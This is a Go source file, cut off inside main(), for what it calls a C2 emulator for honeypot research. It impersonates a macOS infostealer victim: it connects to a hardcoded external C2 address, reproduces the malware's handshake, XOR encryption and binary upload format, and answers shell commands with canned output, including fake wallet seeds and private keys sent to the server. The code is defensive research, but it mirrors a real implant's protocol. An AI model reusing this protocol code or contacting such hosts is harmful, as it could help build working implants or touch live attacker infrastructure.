// Package main implements a C2 emulator for security research and honeypot analysis.
package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"embed"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	mathrand "math/rand/v2"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

//go:embed screenshot.jpg
var embedFS embed.FS

const (
	C2Host    = "46.30.191.141"
	HTTPURL   = "http://46.30.191.141/index.php" //nolint:revive // unsecure-url-scheme: HTTP intentional for C2
	TCPPort   = "1337"
	UserAgent = "curl/8.4.0"
	IDFile    = ".victim_id"
	Marker    = 'K'
	// Boundary is the binary boundary decrypted from 0x10001a621.
	Boundary = "60ebe5b6-e8c2-4a2c-9037-647a50691f16"
	TCPSig   = 0x41765DDA
)

var OpcodeMap = map[string]string{
	"1": "FULL_RECON",
	"2": "SCREENSHOT",
	"3": "CREDENTIAL_SWEEP",
	"4": "FILE_SEARCH",
	"5": "EXEC_SHELL",
	"6": "TERMINATE",
}

// Realistic Exodus wallet data matching real malware targets.
const fakeExodusWallet = `{
  "mnemonic": "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
  "seed": "5eb00bbddcf069084889a8ab9155568165f5c453ccb85e70811aaed6f6da5fc19a5ac40b389cd370d086206dec8aa6c43daea6690f20ad3d8d48b2d2ce9e38e4",
  "masterFingerprint": 1545503075,
  "balance": {
    "BTC": "0.08473291",
    "ETH": "2.34216789",
    "USDT": "1247.83"
  },
  "addresses": {
    "bitcoin": "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
    "ethereum": "0x742d35Cc6634C0532925a3b844Bc9e7FE3d1b4E4"
  }
}`

type Emulator struct {
	Log      *slog.Logger
	Client   *http.Client
	UUID     string // 36-char string with hyphens
	RawID    string // 32-char uppercase hex
	Hostname string
	User     string
}

func NewEmulator() *Emulator {
	// All logging goes to stderr for comprehensive visibility
	logger := slog.New(slog.NewJSONHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelDebug}))
	logger.Info("emulator_initializing")

	id := loadUUID(logger)
	rawID := strings.ToUpper(strings.ReplaceAll(id, "-", ""))

	logger.Info("emulator_identity_established", "uuid", id, "raw_id", rawID)

	return &Emulator{
		UUID:     id,
		RawID:    rawID,
		Hostname: "Alexs-MacBook-Air",
		User:     "alex",
		Log:      logger,
		Client: &http.Client{
			Timeout: 300 * time.Second, // Matches CURLOPT_TIMEOUT
			Transport: &http.Transport{
				DisableCompression: true,
			},
		},
	}
}

func loadUUID(logger *slog.Logger) string {
	logger.Debug("uuid_loading", "file", IDFile)

	if data, err := os.ReadFile(IDFile); err == nil {
		id := strings.TrimSpace(string(data))
		logger.Info("uuid_loaded_from_file", "uuid", id, "source", "persistent")
		return id
	}

	logger.Info("uuid_generating_new", "reason", "file_not_found")

	//nolint:gosec // Weak random intentional for realistic emulation
	id := fmt.Sprintf("%08X-%04X-4%03X-8%03X-%012X",
		mathrand.Uint32(), mathrand.Uint32()>>16, mathrand.Uint32()>>20, mathrand.Uint32()>>20, mathrand.Uint64()>>16)

	logger.Debug("uuid_generated", "uuid", id)

	//nolint:gosec // File permissions match typical malware behavior
	if err := os.WriteFile(IDFile, []byte(id), 0o644); err != nil {
		logger.Warn("uuid_persist_failed", "error", err, "mode", "ephemeral")
		return id
	}

	logger.Info("uuid_persisted", "file", IDFile, "mode", "persistent")
	return id
}

func (e *Emulator) xor(data []byte) []byte {
	key := []byte(e.RawID)
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}

	// Log wire-level details for debugging protocol compatibility
	inputPreview := data
	if len(data) > 64 {
		inputPreview = data[:64]
	}
	outputPreview := out
	if len(out) > 64 {
		outputPreview = out[:64]
	}

	e.Log.Debug("xor_operation",
		"input_len", len(data),
		"output_len", len(out),
		"key_len", len(key),
		"key_hex", hex.EncodeToString(key[:min(len(key), 32)]),
		"input_hex_preview", hex.EncodeToString(inputPreview),
		"output_hex_preview", hex.EncodeToString(outputPreview),
		"input_ascii_preview", string(inputPreview),
	)
	return out
}

// buildMultiplexedItem implements the binary TLV format from sym.func.10001108c.
func (e *Emulator) buildMultiplexedItem(name string, data []byte) []byte {
	e.Log.Debug("building_multiplexed_item", "name", name, "data_len", len(data))

	buf := new(bytes.Buffer)

	// Log each component being written
	e.Log.Debug("tlv_writing_boundary", "boundary", Boundary, "length", len(Boundary))
	buf.WriteString(Boundary)

	e.Log.Debug("tlv_writing_type", "type", "0x01", "meaning", "File")
	buf.WriteByte(0x01) // Type: File

	//nolint:gosec // G115: integer overflow conversion int -> uint32 (data length bounded by protocol)
	dataLen := uint32(len(data))
	e.Log.Debug("tlv_writing_data_length", "length", dataLen, "hex", fmt.Sprintf("0x%08x", dataLen))
	if err := binary.Write(buf, binary.LittleEndian, dataLen); err != nil {
		e.Log.Error("binary_write_failed", "error", err, "field", "data_length")
		return nil
	}

	//nolint:gosec // G115: integer overflow conversion int -> uint32 (name length bounded by protocol)
	nameLen := uint32(len(name) + 1) // +1 for null terminator
	e.Log.Debug("tlv_writing_name_length", "length", nameLen, "hex", fmt.Sprintf("0x%08x", nameLen), "includes_null", true)
	if err := binary.Write(buf, binary.LittleEndian, nameLen); err != nil {
		e.Log.Error("binary_write_failed", "error", err, "field", "name_length")
		return nil
	}

	e.Log.Debug("tlv_writing_name", "name", name, "length", len(name))
	buf.WriteString(name)

	e.Log.Debug("tlv_writing_null_terminator")
	buf.WriteByte(0x00) // Null Terminator (Crucial for Parser Alignment)

	dataPreview := data
	if len(data) > 32 {
		dataPreview = data[:32]
	}
	e.Log.Debug("tlv_writing_data", "data_length", len(data), "data_hex_preview", hex.EncodeToString(dataPreview))
	buf.Write(data)

	result := buf.Bytes()

	// Log the complete structure for wire-level debugging
	headerEnd := len(Boundary) + 1 + 4 + 4 + len(name) + 1
	if headerEnd <= len(result) {
		e.Log.Info("multiplexed_item_structure",
			"name", name,
			"total_size", len(result),
			"boundary_size", len(Boundary),
			"header_size", headerEnd,
			"data_size", len(data),
			"header_hex", hex.EncodeToString(result[:min(headerEnd, 128)]),
		)
	}

	e.Log.Info("multiplexed_item_built", "name", name, "total_size", len(result))
	return result
}

func (e *Emulator) postHTTP(payload []byte, label string) {
	e.Log.Info("http_post_starting", "stage", label, "payload_size", len(payload))

	// Log raw payload before encryption (both hex and human-readable)
	payloadPreview := payload
	if len(payload) > 256 {
		payloadPreview = payload[:256]
	}
	e.Log.Info("http_payload_plaintext",
		"stage", label,
		"size", len(payload),
		"content", string(payload),
	)
	e.Log.Debug("http_payload_raw_hex",
		"stage", label,
		"size", len(payload),
		"hex_preview", hex.EncodeToString(payloadPreview),
	)

	encrypted := e.xor(payload)
	packet := make([]byte, 33+len(encrypted))
	copy(packet[0:32], e.RawID)
	packet[32] = Marker
	copy(packet[33:], encrypted)

	// Log complete packet structure for wire-level debugging
	e.Log.Info("http_packet_structure",
		"stage", label,
		"total_size", len(packet),
		"raw_id_offset", 0,
		"raw_id_length", 32,
		"marker_offset", 32,
		"marker_value", fmt.Sprintf("0x%02x ('%c')", Marker, Marker),
		"encrypted_offset", 33,
		"encrypted_length", len(encrypted),
	)

	// Log first 128 bytes of complete packet as hex
	packetPreview := packet
	if len(packet) > 128 {
		packetPreview = packet[:128]
	}
	e.Log.Debug("http_packet_hex_dump",
		"stage", label,
		"preview_length", len(packetPreview),
		"packet_hex", hex.EncodeToString(packetPreview),
		"raw_id_hex", hex.EncodeToString(packet[0:32]),
		"marker_hex", fmt.Sprintf("%02x", packet[32]),
	)

	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, HTTPURL, bytes.NewBuffer(packet))
	if err != nil {
		e.Log.Error("http_request_creation_failed", "stage", label, "error", err)
		return
	}

	req.Header = make(http.Header)
	req.Header["Host"] = []string{C2Host}
	req.Header["User-Agent"] = []string{UserAgent}
	req.Header["Accept"] = []string{"*/*"}
	req.Header["Content-Type"] = []string{"application/octet-stream"}
	req.Header["Expect"] = []string{"100-continue"}
	req.Header["Connection"] = []string{"Keep-Alive"}

	e.Log.Info("http_request_sending",
		"stage", label,
		"url", HTTPURL,
		"method", "POST",
		"content_length", len(packet),
		"user_agent", UserAgent,
		"headers", fmt.Sprintf("%v", req.Header),
	)

	resp, err := e.Client.Do(req)
	if err != nil {
		e.Log.Error("http_request_failed", "stage", label, "error", err, "url", HTTPURL)
		return
	}

	// Log all response headers for protocol debugging
	e.Log.Info("http_response_received",
		"stage", label,
		"status_code", resp.StatusCode,
		"status", resp.Status,
		"proto", resp.Proto,
		"content_length", resp.ContentLength,
		"transfer_encoding", resp.TransferEncoding,
		"headers", fmt.Sprintf("%v", resp.Header),
	)

	defer func() {
		if closeErr := resp.Body.Close(); closeErr != nil {
			e.Log.Warn("http_response_close_error", "stage", label, "error", closeErr)
		} else {
			e.Log.Debug("http_response_closed", "stage", label)
		}
	}()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		e.Log.Error("http_response_read_error", "stage", label, "error", err)
		return
	}

	e.Log.Info("http_response_body_read",
		"stage", label,
		"body_size", len(body),
		"status_code", resp.StatusCode)

	if len(body) > 0 {
		bodyPreview := body
		if len(body) > 256 {
			bodyPreview = body[:256]
		}
		e.Log.Info("http_response_body_plaintext",
			"stage", label,
			"body_size", len(body),
			"content", string(body),
		)
		e.Log.Debug("http_response_body_hex",
			"stage", label,
			"body_size", len(body),
			"hex_preview", hex.EncodeToString(bodyPreview),
		)
	} else {
		e.Log.Debug("http_response_body_empty", "stage", label)
	}

	e.Log.Info("http_post_completed", "stage", label, "success", true)
}

//nolint:revive,maintidx // Intentionally comprehensive for realistic C2 command emulation
func (e *Emulator) handleShell(command string) string {
	cmd := strings.TrimSpace(command)
	e.Log.Warn("REMOTE_SHELL", "cmd", cmd)
	//nolint:gosec // Weak random intentional for realistic command delay simulation
	time.Sleep(time.Duration(200+mathrand.IntN(300)) * time.Millisecond)

	// Handle common C2 reconnaissance commands
	switch {
	case cmd == "whoami":
		return e.User
	case cmd == "hostname":
		return e.Hostname
	case cmd == "pwd":
		return "/Users/" + e.User
	case cmd == "id":
		return "uid=501(" + e.User + ") gid=20(staff) groups=20(staff),12(everyone)," +
			"61(localaccounts),80(admin),701(com.apple.sharepoint.group.1)," +
			"33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers)"
	case cmd == "groups":
		return "staff everyone localaccounts admin com.apple.sharepoint.group.1 _appstore " +
			"_lpadmin _lpoperator _developer _analyticsusers"
	case cmd == "sw_vers":
		return "ProductName:\t\tmacOS\nProductVersion:\t\t14.2.1\nBuildVersion:\t\t23C71"
	case cmd == "uname":
		return "Darwin"
	case cmd == "uname -a":
		return "Darwin " + e.Hostname + " 23.2.0 Darwin Kernel Version 23.2.0: " +
			"Wed Nov 15 21:28:27 PST 2023; root:xnu-10002.61.3~2/RELEASE_ARM64_T8103 arm64"
	case cmd == "uname -s":
		return "Darwin"
	case cmd == "uname -m":
		return "arm64"
	case cmd == "uname -r":
		return "23.2.0"
	case cmd == "arch":
		return "arm64"

	// File system commands
	case cmd == "ls":
		return "Desktop\nDocuments\nDownloads\nLibrary\nMovies\nMusic\nPictures\nPublic"
	case cmd == "ls -la" || cmd == "ls -al":
		return "total 24\n" +
			"drwxr-x---+ 15 " + e.User + "  staff   480 Jan 15 14:23 .\n" +
			"drwxr-xr-x   5 root   admin   160 Sep 24 10:15 ..\n" +
			"-rw-------   1 " + e.User + "  staff   183 Jan 15 14:23 .bash_history\n" +
			"-rw-r--r--   1 " + e.User + "  staff  1024 Sep 24 10:15 .zshrc\n" +
			"drwx------+  5 " + e.User + "  staff   160 Jan 15 09:32 Desktop\n" +
			"drwx------+  8 " + e.User + "  staff   256 Jan 12 16:44 Documents\n" +
			"drwx------+ 12 " + e.User + "  staff   384 Jan 14 11:22 Downloads\n" +
			"drwx------@ 82 " + e.User + "  staff  2624 Jan 10 08:15 Library\n" +
			"drwx------   4 " + e.User + "  staff   128 Sep 28 12:01 Movies\n" +
			"drwx------   3 " + e.User + "  staff    96 Sep 24 10:22 Music\n" +
			"drwx------   5 " + e.User + "  staff   160 Oct 15 14:33 Pictures\n" +
			"drwxr-xr-x   4 " + e.User + "  staff   128 Sep 24 10:22 Public"
	case cmd == "ls -la ~/Documents":
		return "total 16\n" +
			"drwx------+  8 " + e.User + "  staff   256 Jan 12 16:44 .\n" +
			"drwxr-x---+ 15 " + e.User + "  staff   480 Jan 15 14:23 ..\n" +
			"-rw-r--r--   1 " + e.User + "  staff  1024 Feb 10 09:00 recovery_seed.txt\n" +
			"-rw-r--r--   1 " + e.User + "  staff  4096 Jan 08 11:15 passwords.docx"
	case cmd == "ls /Applications":
		return "1Password.app\nBrave Browser.app\nChrome.app\nDiscord.app\nElectrum.app\n" +
			"Exodus.app\nFirefox.app\nLedger Live.app\nSafari.app\nSignal.app\n" +
			"Slack.app\nTelegram.app\nVisual Studio Code.app"

	// Process and system info
	case cmd == "ps aux" || cmd == "ps -ef":
		return "USER   PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND\n" +
			e.User + "   412   2.1  1.4 34567890 123456   ??  S    Mon 9AM   42:13.45 " +
			"/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder\n" +
			e.User + "   428   1.8  2.1 45678901 234567   ??  S    Mon 9AM   38:22.11 " +
			"/Applications/Safari.app/Contents/MacOS/Safari\n" +
			e.User + "   501   0.5  0.8 12345678  87654   ??  S    Mon 9AM   12:05.33 " +
			"/Applications/Chrome.app/Contents/MacOS/Google Chrome\n" +
			e.User + "   612   0.2  0.3  9876543  34567   ??  S    Mon 9AM    5:11.22 " +
			"/System/Library/PrivateFrameworks/CloudKitDaemon\n" +
			e.User + "   702   0.0  0.1  5432109  12345   ??  S    Mon 9AM    0:45.67 /usr/libexec/trustd"
	case strings.HasPrefix(cmd, "ps aux | grep"):
		return e.User + "   1234   0.0  0.0  4268234    892 s000  S+    2:45PM   0:00.00 grep " +
			strings.TrimPrefix(cmd, "ps aux | grep ")
	case cmd == "top -l 1":
		return "Processes: 412 total, 2 running, 410 sleeping, 2124 threads\n" +
			"Load Avg: 2.15, 1.98, 1.87  CPU usage: 5.23% user, 8.12% sys, 86.65% idle\n" +
			"SharedLibs: 245M resident, 67M data, 23M linkedit.\n" +
			"MemRegions: 123456 total, 3456M resident, 123M private, 2345M shared.\n" +
			"PhysMem: 14G used (2145M wired), 2048M unused.\n" +
			"VM: 4567G vsize, 1234M framework vsize, 0(0) swapins, 0(0) swapouts."

	// Network commands
	case cmd == "ifconfig en0":
		return "en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500\n" +
			"\toptions=400<CHANNEL_IO>\n" +
			"\tether a4:83:e7:2f:b1:c3\n" +
			"\tinet 192.168.1.147 netmask 0xffffff00 broadcast 192.168.1.255\n" +
			"\tinet6 fe80::a683:e7ff:fe2f:b1c3%en0 prefixlen 64 scopeid 0x4\n" +
			"\tmedia: autoselect\n" +
			"\tstatus: active"
	case cmd == "ipconfig getifaddr en0":
		return "192.168.1.147"
	case cmd == "netstat -an":
		return "Active Internet connections (including servers)\n" +
			"Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)\n" +
			"tcp4       0      0  192.168.1.147.52341    17.248.144.25.443      ESTABLISHED\n" +
			"tcp4       0      0  192.168.1.147.52340    140.82.113.26.443      ESTABLISHED\n" +
			"tcp4       0      0  *.88                   *.*                    LISTEN"
	case strings.HasPrefix(cmd, "ping -c"):
		parts := strings.Fields(cmd)
		if len(parts) >= 3 {
			return "PING " + parts[2] + " (1.2.3.4): 56 data bytes\n" +
				"64 bytes from 1.2.3.4: icmp_seq=0 ttl=54 time=12.345 ms\n" +
				"64 bytes from 1.2.3.4: icmp_seq=1 ttl=54 time=11.234 ms"
		}
		return "ping: usage error: Destination address required"

	// macOS-specific commands
	case strings.HasPrefix(cmd, "system_profiler"):
		return "Hardware Overview:\n\n" +
			"      Model Name: MacBook Air\n" +
			"      Model Identifier: MacBookAir10,1\n" +
			"      Chip: Apple M1\n" +
			"      Total Number of Cores: 8 (4 performance and 4 efficiency)\n" +
			"      Memory: 16 GB\n" +
			"      System Firmware Version: 10151.61.4\n" +
			"      OS Loader Version: 10151.61.4\n" +
			"      Serial Number (system): C02ABC123DEF\n" +
			"      Hardware UUID: " + e.UUID
	case cmd == "csrutil status":
		return "System Integrity Protection status: enabled."
	case cmd == "spctl --status":
		return "assessments enabled"
	case cmd == "pmset -g":
		return "System-wide power settings:\n" +
			"Currently in use:\n" +
			" standbydelay         10800\n" +
			" womp                 1\n" +
			" hibernatefile        /var/vm/sleepimage\n" +
			" powernap             1\n" +
			" networkoversleep     0\n" +
			" sleep                10 (sleep prevented by coreaudiod)\n" +
			" ttyskeepawake        1\n" +
			" hibernatemode        3\n" +
			" displaysleep         10"

	// Launchctl
	case cmd == "launchctl list" || strings.HasPrefix(cmd, "launchctl list"):
		return "PID\tStatus\tLabel\n" +
			"412\t0\tcom.apple.Finder\n" +
			"428\t0\tcom.apple.Safari\n" +
			"501\t0\tcom.google.Chrome\n" +
			"-\t0\tcom.apple.icloud.fmfd\n" +
			"-\t0\tcom.apple.cloudd\n" +
			"-\t0\tcom.apple.notificationcenterui"

	// Environment and paths
	case cmd == "env" || cmd == "printenv":
		return "SHELL=/bin/zsh\n" +
			"USER=" + e.User + "\n" +
			"PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n" +
			"HOME=/Users/" + e.User + "\n" +
			"LOGNAME=" + e.User + "\n" +
			"TMPDIR=/var/folders/xy/abcd1234/T/\n" +
			"TERM=xterm-256color\n" +
			"LANG=en_US.UTF-8"
	case strings.HasPrefix(cmd, "echo $"):
		envVar := strings.TrimPrefix(cmd, "echo $")
		switch envVar {
		case "PATH":
			return "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
		case "HOME":
			return "/Users/" + e.User
		case "USER":
			return e.User
		case "SHELL":
			return "/bin/zsh"
		default:
			return ""
		}

	// User enumeration
	case cmd == "dscl . -list /Users":
		return "_amavisd\n_appleevents\n_applepay\n_appstore\n_ard\n" + e.User +
			"\ndaemon\nnobody\nroot"
	case cmd == "sudo -l":
		return "Sorry, user " + e.User + " may not run sudo on " + e.Hostname + "."
	case cmd == "w" || cmd == "who":
		return e.User + " console  Jan 15 09:32\n" + e.User + " ttys000  Jan 15 14:23"

	// File operations
	case strings.HasPrefix(cmd, "which "):
		binaryName := strings.TrimPrefix(cmd, "which ")
		binaryName = strings.TrimSpace(binaryName)
		switch binaryName {
		case "python", "python3":
			return "/usr/bin/python3"
		case "ruby":
			return "/usr/bin/ruby"
		case "perl":
			return "/usr/bin/perl"
		case "curl":
			return "/usr/bin/curl"
		case "git":
			return "/usr/bin/git"
		case "ssh":
			return "/usr/bin/ssh"
		case "openssl":
			return "/usr/bin/openssl"
		default:
			return "" // Binary not found (e.g., wget not installed by default on macOS)
		}
	case strings.HasPrefix(cmd, "cat "):
		filename := strings.TrimPrefix(cmd, "cat ")
		filename = strings.TrimSpace(filename)
		switch filename {
		case "/etc/passwd":
			return "nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\n" +
				"root:*:0:0:System Administrator:/var/root:/bin/sh\n" +
				"daemon:*:1:1:System Services:/var/root:/usr/bin/false\n" +
				e.User + ":*:501:20:User Name:/Users/" + e.User + ":/bin/zsh"
		case "~/.ssh/config", ".ssh/config":
			return "Host github.com\n  AddKeysToAgent yes\n  UseKeychain yes\n  IdentityFile ~/.ssh/id_ed25519"
		case "~/.zshrc", ".zshrc":
			return "export PATH=/usr/local/bin:$PATH\nalias ll='ls -la'\nexport EDITOR=vim"
		case "~/.ssh/id_rsa", ".ssh/id_rsa":
			return "-----BEGIN OPENSSH PRIVATE KEY-----\n" +
				"b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn\n" +
				"NhAAAAAwEAAQAAAgEAw4s6K1Y2Vwz9hJ8vL3pQwJ9rK5nE8dP2mF1sT4uV6xW7yZ8aB9cC\n" +
				"[TRUNCATED - 3072 more bytes]"
		default:
			switch {
			case strings.Contains(filename, "exodus") && strings.Contains(filename, "wallet"):
				return fakeExodusWallet
			case strings.Contains(filename, "seed") || strings.Contains(filename, "wallet"):
				return fakeExodusWallet
			case strings.Contains(filename, "private") || strings.Contains(filename, "key"):
				return "-----BEGIN EC PRIVATE KEY-----\n" +
					"MHcCAQEEIIGN7R5n3LYvWz7qF8p3K9sJ2mT1xU4vW5yX6zA7bC8dDoAoGCCqGSM49\n" +
					"AwEHoUQDQgAE7xK5NqP3tR8sU9vW0xY1zA2bC3dE4fF5gG6hH7iI8jJ9kK0lL1mM\n" +
					"2nN3oO4pP5qQ6rR7sS8tT9uU0vV1wW2xX3yY4zA==\n" +
					"-----END EC PRIVATE KEY-----"
			default:
				return "cat: " + filename + ": No such file or directory"
			}
		}
	case strings.HasPrefix(cmd, "find "):
		if strings.Contains(cmd, "wallet") || strings.Contains(cmd, "Exodus") || strings.Contains(cmd, "exodus") {
			return "/Users/" + e.User + "/Library/Application Support/Exodus/exodus.wallet"
		} else if strings.Contains(cmd, ".ssh") {
			return "/Users/" + e.User + "/.ssh/config\n" +
				"/Users/" + e.User + "/.ssh/known_hosts"
		}
		return "/Users/" + e.User + "/Documents\n/Users/" + e.User + "/Desktop"
	case cmd == "df -h" || cmd == "df":
		return "Filesystem       Size   Used  Avail Capacity iused      ifree %iused  Mounted on\n" +
			"/dev/disk3s1s1  460Gi  9.8Gi  250Gi     4%  356821 4881967214    0%   /\n" +
			"/dev/disk3s6    460Gi  3.0Gi  250Gi     2%       3 4882324032    0%   /System/Volumes/VM\n" +
			"/dev/disk3s2    460Gi  197Gi  250Gi    45% 1024837 4881299198    0%   /System/Volumes/Data"
	case cmd == "date":
		return time.Now().Format("Mon Jan 2 15:04:05 MST 2006")
	case cmd == "uptime":
		return " 14:23  up 7 days,  3:42, 2 users, load averages: 2.15 1.98 1.87"

	// Default response for unknown commands
	default:
		parts := strings.Fields(cmd)
		if len(parts) > 0 {
			return "zsh: command not found: " + parts[0]
		}
		return "zsh: command not found"
	}
}

//nolint:gocognit,maintidx // Intentionally comprehensive logging for wire protocol debugging
func (e *Emulator) runTCPChannel() {
	e.Log.Info("tcp_channel_starting", "host", C2Host, "port", TCPPort)

	for {
		e.Log.Info("tcp_connection_attempting", "host", C2Host, "port", TCPPort, "timeout", "10s")

		dialer := &net.Dialer{Timeout: 10 * time.Second}
		conn, err := dialer.DialContext(context.Background(), "tcp", C2Host+":"+TCPPort)
		if err != nil {
			e.Log.Error("tcp_connection_failed", "host", C2Host, "port", TCPPort, "error", err)
			e.Log.Info("tcp_reconnect_waiting", "delay", "30s")
			time.Sleep(30 * time.Second)
			continue
		}

		e.Log.Info("tcp_connection_established", "remote_addr", conn.RemoteAddr().String(), "local_addr", conn.LocalAddr().String())

		// 1. Send Handshake Signature
		sigBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(sigBytes, uint32(TCPSig))
		e.Log.Info("tcp_handshake_sending",
			"signature_decimal", TCPSig,
			"signature_hex", fmt.Sprintf("0x%08X", TCPSig),
			"signature_bytes_hex", hex.EncodeToString(sigBytes),
			"byte_order", "BigEndian",
		)

		if err := binary.Write(conn, binary.BigEndian, uint32(TCPSig)); err != nil {
			e.Log.Error("tcp_handshake_write_failed", "error", err)
			if closeErr := conn.Close(); closeErr != nil {
				e.Log.Warn("tcp_handshake_close_error", "error", closeErr)
			} else {
				e.Log.Debug("tcp_connection_closed_after_handshake_failure")
			}
			continue
		}
		e.Log.Info("tcp_handshake_sent", "signature_hex", fmt.Sprintf("0x%08X", TCPSig), "bytes_sent", 4)

		for {
			// 2. Send Heartbeat
			heartbeat := fmt.Sprintf("ID: %s | STATUS: IDLE", e.RawID)
			e.Log.Debug("tcp_heartbeat_preparing", "message", heartbeat, "plaintext_len", len(heartbeat))

			payload := e.xor([]byte(heartbeat))
			//nolint:gosec // G115: integer overflow conversion int -> uint32 (length is bounded by protocol)
			payloadLen := uint32(len(payload))

			// Log the length header bytes
			lenBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(lenBytes, payloadLen)

			payloadPreview := payload
			if len(payload) > 64 {
				payloadPreview = payload[:64]
			}

			e.Log.Info("tcp_heartbeat_sending",
				"plaintext", heartbeat,
				"plaintext_len", len(heartbeat),
				"encrypted_len", payloadLen,
				"length_header_hex", hex.EncodeToString(lenBytes),
				"payload_hex_preview", hex.EncodeToString(payloadPreview),
				"byte_order", "LittleEndian",
			)

			if err := binary.Write(conn, binary.LittleEndian, payloadLen); err != nil {
				e.Log.Error("tcp_heartbeat_length_write_failed", "error", err, "attempted_len", payloadLen)
				break
			}
			e.Log.Debug("tcp_heartbeat_length_sent", "bytes", 4, "length_value", payloadLen)

			bytesWritten, err := conn.Write(payload)
			if err != nil {
				e.Log.Error("tcp_heartbeat_payload_write_failed", "error", err, "bytes_written", bytesWritten, "expected", payloadLen)
				break
			}

			e.Log.Info("tcp_heartbeat_sent", "total_bytes", bytesWritten+4, "length_header_bytes", 4, "payload_bytes", bytesWritten)

			// 3. Wait for Command
			deadline := time.Now().Add(70 * time.Second)
			e.Log.Debug("tcp_command_waiting", "read_deadline", deadline.Format(time.RFC3339), "timeout_seconds", 70)

			if err := conn.SetReadDeadline(deadline); err != nil {
				e.Log.Error("tcp_set_deadline_failed", "error", err)
				break
			}

			// Read length header (4 bytes, little-endian)
			var cmdLen uint32
			err = binary.Read(conn, binary.LittleEndian, &cmdLen)
			if err != nil {
				e.Log.Warn("tcp_command_length_read_failed", "error", err, "error_type", fmt.Sprintf("%T", err))
				break
			}

			// Read and log the raw length bytes for debugging
			lenBytes = make([]byte, 4)
			binary.LittleEndian.PutUint32(lenBytes, cmdLen)
			e.Log.Info("tcp_command_length_received",
				"cmd_len_decimal", cmdLen,
				"cmd_len_hex", fmt.Sprintf("0x%08x", cmdLen),
				"length_bytes_hex", hex.EncodeToString(lenBytes),
				"byte_order", "LittleEndian",
			)

			if cmdLen == 0 {
				e.Log.Error("tcp_command_zero_length", "cmd_len", cmdLen)
				break
			}
			if cmdLen > 1024*1024 { // Sanity check: 1MB max
				e.Log.Error("tcp_command_length_too_large", "cmd_len", cmdLen, "max_allowed", 1024*1024)
				break
			}

			cmdBuf := make([]byte, cmdLen)
			var bytesRead int
			bytesRead, err = io.ReadFull(conn, cmdBuf)
			if err != nil {
				e.Log.Error("tcp_command_read_failed",
					"error", err,
					"error_type", fmt.Sprintf("%T", err),
					"bytes_read", bytesRead,
					"expected", cmdLen)
				break
			}

			cmdPreview := cmdBuf
			if len(cmdBuf) > 128 {
				cmdPreview = cmdBuf[:128]
			}
			e.Log.Debug("tcp_command_received_encrypted_hex",
				"bytes_read", bytesRead,
				"encrypted_len", len(cmdBuf),
				"encrypted_hex_preview", hex.EncodeToString(cmdPreview),
			)

			decrypted := string(e.xor(cmdBuf))
			e.Log.Info("tcp_command_received_plaintext",
				"content", decrypted,
				"plaintext_len", len(decrypted),
				"encrypted_len", len(cmdBuf),
			)

			parts := strings.Split(decrypted, "|")
			if len(parts) == 0 {
				e.Log.Warn("tcp_command_malformed", "raw", decrypted)
				continue
			}

			opcode := parts[0]
			cmdName := OpcodeMap[opcode]

			e.Log.Info("tcp_command_parsed", "opcode", opcode, "command_name", cmdName, "parts_count", len(parts))

			// Action result exfiltration via HTTP (matching binary behavior)
			var result []byte
			switch cmdName {
			case "EXEC_SHELL":
				if len(parts) > 1 {
					e.Log.Info("exec_shell_executing", "command", parts[1])
					shellResult := e.handleShell(parts[1])
					result = []byte(shellResult)
					e.Log.Info("exec_shell_result",
						"command", parts[1],
						"result_len", len(result),
						"output", shellResult,
					)
				} else {
					e.Log.Warn("exec_shell_missing_command")
				}
			case "SCREENSHOT":
				e.Log.Info("screenshot_capturing")
				img, err := embedFS.ReadFile("screenshot.jpg")
				if err != nil {
					e.Log.Error("screenshot_read_failed", "error", err)
				} else {
					e.Log.Debug("screenshot_read", "size", len(img))
					entropy := make([]byte, 16)
					if n, err := rand.Read(entropy); err != nil {
						e.Log.Error("entropy_generation_failed", "error", err)
					} else {
						e.Log.Debug("entropy_generated", "bytes", n)
						result = e.buildMultiplexedItem("screenshot.jpg", append(img, entropy...))
						e.Log.Info("screenshot_prepared", "total_size", len(result))
					}
				}
			case "CREDENTIAL_SWEEP":
				e.Log.Info("credential_sweep_executing")
				e.Log.Info("credential_sweep_data",
					"content", fakeExodusWallet,
					"wallet_type", "Exodus",
				)
				result = e.buildMultiplexedItem("exodus.wallet", []byte(fakeExodusWallet))
				e.Log.Info("credential_sweep_completed",
					"result_len", len(result),
					"wallet", "exodus")
			default:
				e.Log.Warn("tcp_command_unknown", "opcode", opcode, "command_name", cmdName)
				result = []byte("DONE")
			}

			if len(result) > 0 {
				e.Log.Info("tcp_result_exfiltrating", "size", len(result), "via", "HTTP")
				e.postHTTP(result, "cmd_result")
			} else {
				e.Log.Debug("tcp_no_result_to_exfiltrate", "command", cmdName)
			}

			e.Log.Debug("tcp_command_cycle_sleeping", "duration", "60s")
			time.Sleep(60 * time.Second)
		}

		e.Log.Info("tcp_inner_loop_exited", "reason", "read_or_write_error")

		if err := conn.Close(); err != nil {
			e.Log.Warn("tcp_connection_close_error", "error", err)
		} else {
			e.Log.Info("tcp_connection_closed", "will_reconnect", true)
		}
	}
}

func main() {
	e := NewEmulator()
	e.Log.Info("brew_agent_starting",
		"version", "v1.0.4",
		"victim_id", e.RawID,
		"uuid", e.UUID,
		"hostname", e.Hostname,
		"user", e.User,
		"c2_host", C2Host,
		"http_url", HTTPURL,
